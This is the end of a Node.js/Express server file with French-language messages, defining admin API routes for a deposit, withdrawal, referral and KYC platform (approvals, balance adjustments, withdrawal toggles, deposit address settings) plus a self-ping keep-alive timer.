    db.prepare("UPDATE recovery_requests SET status = 'rejected', reject_reason = ?, reviewed_at = CURRENT_TIMESTAMP WHERE id = ?").run(reason || null, req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/stats', requireAdmin, (req, res) => {
  try {
    const totalUsers = db.prepare('SELECT COUNT(*) as count FROM users').get().count;
    const pendingDeposits = db.prepare("SELECT COUNT(*) as count FROM deposits WHERE status = 'pending'").get().count;
    const confirmedDeposits = db.prepare("SELECT COALESCE(SUM(amount),0) as total FROM deposits WHERE status = 'confirmed'").get().total;
    const pendingWithdrawals = db.prepare("SELECT COUNT(*) as count FROM withdrawals WHERE status = 'pending'").get().count;
    const totalWithdrawn = db.prepare("SELECT COALESCE(SUM(amount),0) as total FROM withdrawals WHERE status = 'confirmed'").get().total;
    const pendingKyc = db.prepare("SELECT COUNT(*) as count FROM kyc_submissions WHERE status = 'pending'").get().count;
    const pendingRecovery = db.prepare("SELECT COUNT(*) as count FROM recovery_requests WHERE status = 'pending'").get().count;
    res.json({ totalUsers, pendingDeposits, confirmedDeposits, pendingWithdrawals, totalWithdrawn, pendingKyc, pendingRecovery });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/withdrawals', requireAdmin, (req, res) => {
  try {
    const withdrawals = db.prepare(`
      SELECT w.*, u.email as user_email
      FROM withdrawals w
      JOIN users u ON w.user_id = u.id
      ORDER BY w.created_at DESC
    `).all();
    res.json(withdrawals);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/withdrawals/:id/approve', requireAdmin, (req, res) => {
  const id = req.params.id;
  try {
    const w = db.prepare('SELECT * FROM withdrawals WHERE id = ?').get(id);
    if (!w) return res.status(404).json({ error: 'Retrait non trouvé' });
    if (w.status !== 'pending') return res.status(400).json({ error: 'Déjà traité' });
    db.prepare('UPDATE withdrawals SET status = ? WHERE id = ?').run('confirmed', id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/withdrawals/:id/reject', requireAdmin, (req, res) => {
  const id = req.params.id;
  try {
    const w = db.prepare('SELECT * FROM withdrawals WHERE id = ?').get(id);
    if (!w) return res.status(404).json({ error: 'Retrait non trouvé' });
    if (w.status !== 'pending') return res.status(400).json({ error: 'Déjà traité' });
    db.transaction(() => {
      db.prepare('UPDATE withdrawals SET status = ? WHERE id = ?').run('rejected', id);
      db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(w.amount, w.user_id);
    })();
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/deposits', requireAdmin, (req, res) => {
  try {
    const deposits = db.prepare(`
      SELECT d.*, u.email as user_email 
      FROM deposits d 
      JOIN users u ON d.user_id = u.id 
      ORDER BY d.created_at DESC
    `).all();
    res.json(deposits);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/deposits/:id/approve', requireAdmin, (req, res) => {
  const depositId = req.params.id;

  try {
    const deposit = db.prepare('SELECT * FROM deposits WHERE id = ?').get(depositId);
    
    if (!deposit) {
      return res.status(404).json({ error: 'Dépôt non trouvé' });
    }

    if (deposit.status !== 'pending') {
      return res.status(400).json({ error: 'Ce dépôt a déjà été traité' });
    }

    const transaction = db.transaction(() => {
      db.prepare('UPDATE deposits SET status = ? WHERE id = ?').run('confirmed', depositId);
      db.prepare('UPDATE users SET deposit_amount = deposit_amount + ?, balance = balance + ? WHERE id = ?').run(deposit.amount, deposit.amount, deposit.user_id);
    });

    transaction();

    res.json({ success: true, message: 'Dépôt approuvé' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/deposits/:id/reject', requireAdmin, (req, res) => {
  const depositId = req.params.id;

  try {
    const deposit = db.prepare('SELECT * FROM deposits WHERE id = ?').get(depositId);
    
    if (!deposit) {
      return res.status(404).json({ error: 'Dépôt non trouvé' });
    }

    if (deposit.status !== 'pending') {
      return res.status(400).json({ error: 'Ce dépôt a déjà été traité' });
    }

    db.prepare('UPDATE deposits SET status = ? WHERE id = ?').run('rejected', depositId);

    res.json({ success: true, message: 'Dépôt rejeté' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/users', requireAdmin, (req, res) => {
  try {
    const users = db.prepare(`
      SELECT u.id, u.email, u.balance, u.deposit_amount, u.referral_code, u.created_at, u.can_withdraw,
        (SELECT COUNT(*) FROM referrals WHERE referrer_id = u.id) as referrals_count,
        (SELECT COALESCE(SUM(amount),0) FROM deposits WHERE user_id = u.id AND status = 'confirmed') as total_deposited,
        (SELECT COALESCE(SUM(amount),0) FROM withdrawals WHERE user_id = u.id AND status = 'confirmed') as total_withdrawn,
        (SELECT COUNT(*) FROM deposits WHERE user_id = u.id AND status = 'pending') as pending_deposits
      FROM users u
      ORDER BY u.created_at DESC
    `).all();
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/users/:id/toggle-withdraw', requireAdmin, (req, res) => {
  const userId = req.params.id;
  try {
    const user = db.prepare('SELECT id, email, can_withdraw FROM users WHERE id = ?').get(userId);
    if (!user) return res.status(404).json({ error: 'Utilisateur non trouvé' });
    const newVal = user.can_withdraw ? 0 : 1;
    db.prepare('UPDATE users SET can_withdraw = ? WHERE id = ?').run(newVal, userId);
    res.json({ success: true, can_withdraw: newVal, email: user.email });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/users/:id/adjust-balance', requireAdmin, (req, res) => {
  const userId = req.params.id;
  const { amount, reason } = req.body;
  if (amount === undefined || isNaN(parseFloat(amount))) {
    return res.status(400).json({ error: 'Montant invalide' });
  }
  try {
    const user = db.prepare('SELECT id, balance FROM users WHERE id = ?').get(userId);
    if (!user) return res.status(404).json({ error: 'Utilisateur non trouvé' });
    db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(parseFloat(amount), userId);
    const updated = db.prepare('SELECT balance FROM users WHERE id = ?').get(userId);
    res.json({ success: true, newBalance: updated.balance });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/api/admin/settings', requireAdmin, (req, res) => {
  try {
    const depositAddress = getDepositAddress();
    res.json({ deposit_address: depositAddress });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.post('/api/admin/settings', requireAdmin, (req, res) => {
  const { deposit_address } = req.body;
  if (!deposit_address || deposit_address.trim().length < 10) {
    return res.status(400).json({ error: 'Adresse invalide (minimum 10 caractères)' });
  }
  try {
    setSetting('deposit_address', deposit_address.trim());
    res.json({ success: true, deposit_address: deposit_address.trim() });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

initDB();
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);

  if (isProduction && process.env.RENDER_EXTERNAL_URL) {
    const appUrl = process.env.RENDER_EXTERNAL_URL;
    const PING_INTERVAL = 14 * 60 * 1000;

    setInterval(() => {
      fetch(`${appUrl}/health`)
        .then(() => console.log('[keep-alive] ping ok'))
        .catch((err) => console.warn('[keep-alive] ping failed:', err.message));
    }, PING_INTERVAL);

    console.log(`[keep-alive] Auto-ping actif toutes les 14 minutes → ${appUrl}/health`);
  }
});
